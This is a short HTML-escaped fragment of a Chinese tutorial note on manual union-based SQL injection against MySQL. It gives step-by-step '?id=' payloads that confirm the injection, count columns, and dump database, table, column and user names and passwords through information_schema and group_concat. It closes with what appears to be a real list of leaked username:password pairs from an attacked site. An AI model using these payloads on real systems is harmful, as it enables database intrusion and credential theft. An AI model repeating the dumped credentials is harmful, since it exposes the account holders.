        <content type="html">&lt;h1 id=&#34;mysql渗透&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql渗透&#34;&gt;#&lt;/a&gt; mysql 渗透&lt;/h1&gt;
&lt;p&gt;mysql 手工注入方法&lt;/p&gt;
&lt;p&gt;?id=1&#39;(测试是否存在注入，报错则存在）&lt;br&gt;
?id=1&#39;-- -(注释后面多余的’limit 0,1 页面正常）&lt;br&gt;
?id=1&#39;order by n-- -(order 测试字段长度，报错则说明超出最大长度）&lt;br&gt;
?id=-1’union select 1,2,3-- -&lt;br&gt;
?id=-1’union select 1,2,database ()-- -(在页面回显出当前的数据库名字）&lt;br&gt;
?id=-1’union select 1,2,group_concat (table_name) from information_schema.tables where table_schema=database () -- -(爆出当前数据库的所有表）&lt;br&gt;
?id=0&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; -- -&lt;br&gt;
(爆出目标表的列名）&lt;br&gt;
?id=0‘ union select 1,2,group_concat (username,0x3a,password) from users-- -(爆出目标列的字段名字)&lt;br&gt;
gpm&#39;gpm12612342,tianze98&#39;9999,wu.weihua&#39;9999,ozchamp&#39;3661000,gpmrite&#39;1197,gpmtest&#39;12358067,eno&#39;eno,dar&#39;dar,gpmapp&#39;123,gpm101&#39;101,gpm116&#39;116&lt;/p&gt;
</content>
